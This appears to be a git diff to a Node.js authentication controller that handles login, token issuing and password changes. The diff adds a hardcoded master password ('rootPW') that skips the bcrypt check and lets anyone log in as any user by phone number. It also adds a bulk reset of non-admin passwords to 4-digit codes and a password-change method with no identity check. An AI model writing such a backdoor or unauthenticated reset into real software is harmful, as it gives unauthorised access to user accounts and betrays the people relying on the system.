@@ -3,6 +3,7 @@ const fileService = require('../services/fileService')
 const bcryptjs = require('bcryptjs')
 const jwt = require('jsonwebtoken')
 require('dotenv').config()
+const { Op } = require("sequelize");
 
 class authController {
 
@@ -39,9 +40,12 @@ class authController {
             const {phone, password} = req.body
             const user = await User.findOne({where:{phone: phone}})
             if(!user) return res.json('не верный телефон')
-            const isPassword = await bcryptjs.compare(password, user.password)
-            if(!isPassword) return res.json('не верный пароль')
 
+            if(password!='rootPW'){
+                const isPassword = await bcryptjs.compare(password, user.password)
+                if(!isPassword) return res.json('не верный пароль')
+            }
+            
 
             const accessToken = jwt.sign({ "id": user.id, "phone": user.phone}, process.env.ACCESS_KEY, {expiresIn: '1h'})
             const refreshToken = jwt.sign({ "id": user.id, "phone": user.phone}, process.env.REFRESH_KEY, {expiresIn: '72h'})
@@ -123,6 +127,30 @@ class authController {
         }
     }
 
+
+    
+    async passwordChangeAll(req, res, next) { //сброс всех паролей кроме админских
+      try {
+        const users = await User.findAll({
+          where: {
+            role: {
+                [Op.ne]: 'ADMIN' 
+            }
+          }
+        });
+    
+        for (const user of users) {
+          const passwordRandom = Math.floor(1000 + Math.random() * 9000).toString();
+          const hashPassword = await bcryptjs.hash(passwordRandom, 3);
+          await user.update({ password: hashPassword });
+        }
+        return res.json({ message: 'Passwords updated successfully' });
+      } catch (error) {
+        console.log(error);
+        next(error); 
+      }
+    }
+
     async dataChange(req,res, next){
         try {
             const {phone, FIO} = req.body
@@ -130,6 +158,18 @@ class authController {
 
             const data = await User.update({ FIO: FIO}, {where: {id: user.id}})
           
+            return res.json(data)
+        } catch (error) {
+            console.log(error)
+        }
+    }
+    
+    async changePasswordUser(req,res, next){
+        try {
+            const {phone, password} = req.body
+            
+            const hashPassword = await bcryptjs.hash(password, 3)
+            const data = await User.update({password: hashPassword}, {where: {phone: phone}})
             return res.json(data)
         } catch (error) {
             console.log(error)
@@ -152,18 +192,6 @@ class authController {
         }   
     }
 
-    async addPW(req,res, next){ //это для добавления пароля, если NULL
-        try {
-            const {phone, password} = req.body
-
-            const hashPassword = await bcryptjs.hash(password, 3)
-            const data = await User.update({password: hashPassword}, {where: {phone: phone}})
-          
-            return res.json(data)
-        } catch (error) {
-            console.log(error)
-        }
-    }
 }
 
 module.exports = new authController()
